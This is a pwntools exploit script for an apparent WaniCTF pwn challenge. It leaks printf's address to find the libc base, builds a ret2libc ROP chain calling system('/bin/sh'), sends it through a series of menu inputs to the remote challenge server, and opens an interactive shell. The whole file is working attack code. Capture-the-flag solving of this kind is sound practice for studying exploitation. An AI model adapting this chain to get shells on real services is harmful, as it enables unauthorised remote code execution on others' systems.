from pwn import *

chall = ELF("chall_patched")
libc = ELF('libc.so.6')

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

# io = process(chall.path)
io = remote("chal-lz56g6.wanictf.org", 9005)
# io = gdb.debug(chall.path, '''
#     break main
#     continue
# ''')

io.recvuntil(b"printf = ")
hint = io.recvuntil(b'\n')
printf_addr = int(hint.decode().strip(), 16)

libc_base_addr = printf_addr - libc.symbols['printf']

rop = ROP(libc)
pop_rdi_ret = int(rop.find_gadget(["pop rdi", "ret"]).address) # ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
ret = pop_rdi_ret + 1

payload = p64(libc_base_addr + ret)
payload += p64(libc_base_addr + pop_rdi_ret)
payload += p64(libc_base_addr + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base_addr + libc.sym["system"])

io.sendlineafter(b'1:', b'aaaa')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'2:', b'bbbb')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'3:', b'cccc')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')

io.recvuntil(b'4:')
io.sendline(payload)
io.sendlineafter(b':', b'+')
io.sendlineafter(b':', b'+')

io.interactive()